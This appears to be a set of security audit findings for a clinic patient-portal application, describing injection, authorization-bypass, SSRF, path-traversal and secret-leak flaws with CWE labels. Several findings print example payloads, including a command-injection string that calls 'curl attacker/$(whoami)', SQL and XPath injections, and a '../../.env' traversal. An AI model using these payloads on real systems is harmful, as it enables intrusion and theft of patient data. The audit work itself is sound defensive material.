extra.message: printLabRequisitionLabel() interpolates the client-supplied labSystem value directly into a child_process.exec() command (`label-print --profile ${labSystem} --mrn ${mrn}`). The /api/documents/requisition-label route passes body.labSystem (any scheduling-staff member's input) with no allowlist, so values such as `quest; curl attacker/$(whoami)` achieve arbitrary OS command execution on the server.

reconcileInsuranceAction() interpolates the form field data.memberId into a raw SQL string executed via prisma.$queryRawUnsafe() (ILIKE '%${data.memberId}%'). The zod schema does not neutralize SQL metacharacters, so an admin can inject arbitrary SQL (e.g. memberId of `%' OR 1=1 --`) to extract the whole Patient/User schema. Use a parameterized $queryRaw template.

findConsentDocumentsForLastSearch() concatenates a stored, user-supplied consent category into an XPath query (`//document[category='${category}']/@id`) without the escaping that findConsentDocumentsByCategory() applies via escapeXPathString(). The category is saved server-side from the authenticated caller's own POST body on /api/documents/consent-search, so a patient can inject XPath (e.g. category=`x' or true() or '1'='1`) to widen the document set returned.

This endpoint is unauthenticated and trusts the x-network-assertion header. decodeNetworkRoleAssertion() (src/lib/corp-directory-client.ts:52-55) merely base64-decodes + JSON.parses the header with no signature verification, and applyNetworkRoleAssertion() (src/lib/network-sso-handoff.ts) escalates the referenced user to role 'clinic_admin' whenever assertion.role == 'clinic_admin'. Any remote attacker can send a forged base64 assertion to promote an arbitrary (known) user id to administrator.

The coverage-view route gates PHI disclosure (patient name, MRN, recent visit-summary contents) on a purely client-asserted flag: resolveCoverageAccess(body.editScope) returns true when the request body's editScope === 'covering'. No check confirms the clinician actually covers/is assigned to the patient (contrast handoff-view/route.ts which calls verifyCoverageAssignment()). Any logged-in clinician can POST {"editScope":"covering"} for any patientId and read that chart.

cwe: CWE-639: Authorization Bypass Through User-Controlled Key

extra.message: Any authenticated patient can retrieve any other patient's RELEASED visit summary (diagnosis, care instructions, provider) by supplying an arbitrary summary id. The route checks role==='patient' but never scopes the query to user.patientId (contrast pdf-copy/route.ts which filters patientId). This is an IDOR exposing protected health information.

cwe: CWE-639: Authorization Bypass Through User-Controlled Key

extra.message: relayHandoffConfirmation() (src/lib/continuity-confirmation-relay.ts) performs an unauthenticated server-side fetch() to the fully attacker-controlled x-partner-callback-url header with no host allowlist (unlike portal-confirmation-relay.ts which pins ALLOWED_CALLBACK_HOSTS). Anyone holding/guessing a 6-digit collab code can target internal hosts/cloud metadata endpoints (SSRF). Collab codes are 6 digits with no rate limiting, so brute force is plausible within the 24h validity.

renderHandoffLetter() builds and executes a shell command via execSync(`pandoc ${src} -o ${out}`) where the format query parameter flows into the output path/extension. The /api/continuity/letter route passes format through without the ALLOWED_FORMATS allowlist used by discharge-letter.ts, so a staff user can supply format like `pdf" && <command> && "` to run arbitrary OS commands. Use spawnSync arg arrays and an allowlist.

This route returns text/html built by string-interpolating DB fields — including appt.reason, which is typed by the patient at booking — with no HTML encoding. A patient who books with reason `` stores a payload that executes in the portal origin whenever a staff member opens the queue-ticket URL (e.g. from the kiosk workflow).

hashToken() is a no-op returning the raw token, so session tokens are stored in plaintext and sessions are keyed purely by the raw cookie value. A DB leak exposes live, replayable session tokens, and because the token is not transformed an attacker who generates a session can fixate that known token as a victim's cookie before the victim logs in (session fixation). Hash with SHA-256 as shift-handoff.ts already does.

cwe: CWE-916: Password Hash With Insufficient Computational Effort

extra.message: buildHandoffReturnRedirect() (src/lib/continuity-return.ts:11-13) redirects to whatever x-partner-return-url the client supplies via new URL(header, requestUrl) with no allowlist. An attacker with a (6-digit, unauthenticated, brute-forceable) ack code can craft a link that 302-redirects a victim to an arbitrary external phishing origin. The sibling portal confirm-return path correctly validates against ALLOWED_PORTAL_RETURNS.

doc.title is a patient-supplied upload-time string placed verbatim into the Content-Disposition response header. It is not stripped of CR/LF (referral-copy/route.ts does .replace(/[\r\n]/g, ' ')), enabling HTTP response-header injection / splitting (e.g. injecting Set-Cookie or arbitrary headers) when the title contains encoded newlines.

cwe: CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers

extra.message: Both kiosk-handoff and workstation-handoff take an arbitrary badgeId from the request and re-point the caller's session at that user with no PIN/password/second factor. Any scheduling-capable staff member can hand their session over to a clinic_admin's or clinician's user id (obtained via directory/roster views) and act as that higher-privilege account.

loadIntakeTemplate() (src/lib/intake-templates.ts:13-16) joins the client-supplied variant value onto the templates/intake directory with no basename or containment check before readFileSync. A scheduling-staff user can pass variant=../../.env or similar and download arbitrary readable files. (Sibling loaders loadConsentForm/loadPolicyDocument apply basename+containment; this one does not.)

applySelfCheckinUpdate() (src/lib/checkin-intake.ts:12-17) spreads the raw client JSON body directly into prisma.patient.update({ data: { ...payload } }). A checking-in patient (or staff path) can overwrite arbitrary Patient columns — including insuranceMemberId/insuranceProvider, dateOfBirth, and other fields never intended for self-service. Validate with an explicit schema (as applyConciergeContactUpdate does).

cwe: CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes

extra.message: The PATCH body is parsed as an arbitrary object and spread unvalidated in applyCarePreferencesUpdate() (src/lib/care-preferences.ts:10-17). Reachable by a patient for their own record and by staff for any patient, this lets a client write arbitrary Patient columns (e.g. insurance fields feeding coverage/eligibility decisions) rather than only the intended preference fields.

cwe: CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes

extra.message: storeWidgetBrandingAsset() (src/lib/widget-assets.ts:13-19) writes the raw upload to path.join('public/widget-assets', fileName) where fileName comes from the x-asset-filename header with no basename/extension/content validation. Any staff user can write attacker bytes to arbitrary paths under public/ (e.g. ../routes/…, service-worker.js, next build assets), enabling stored XSS by overwriting static JS/HTML.

cwe: CWE-434: Unrestricted Upload of Dangerous File Type

extra.message: The lab-status widget reflects any request Origin into Access-Control-Allow-Origin and sets Access-Control-Allow-Credentials: true. Although the endpoint itself requires an API key, the credential-bearing header plus full origin reflection is a permissive CORS policy; the same unchecked origin-reflection pattern appears on the public booking-widget route. Restrict to a fixed partner allowlist (as type-directory-widget does).

cwe: CWE-942: Permissive Cross-domain Policy with Untrusted Domains

extra.message: When the client passes responseLevel=full, internal errors are returned to the caller with e.message AND e.stack, exposing server stack traces, file paths, and potentially DB/secrets details to any authenticated user or API-key partner (CWE-209).

cwe: CWE-209: Generation of Error Message Containing Sensitive Information

extra.message: SMS gateway failures log the entire config object, including accountSid and authToken (the gateway's live Basic-auth secret), to the server log. Anyone who can read logs/aggregators obtains the SMS gateway credentials.

cwe: CWE-532: Insertion of Sensitive Information into Log File

extra.message: The request-integrity HMAC secret falls back to a hardcoded well-known value ('riverside-clinic-request-integrity-secret') when the env var is unset. Because the derived token is HMAC(sessionToken) and the raw session token is stored/transmitted in plaintext (see auth.ts), anyone aware of the default secret can forge valid request tokens and defeat the CSRF protection on the void endpoint. Identical fallback-secret anti-patterns exist in src/lib/relay.ts and src/lib/continuity.ts.
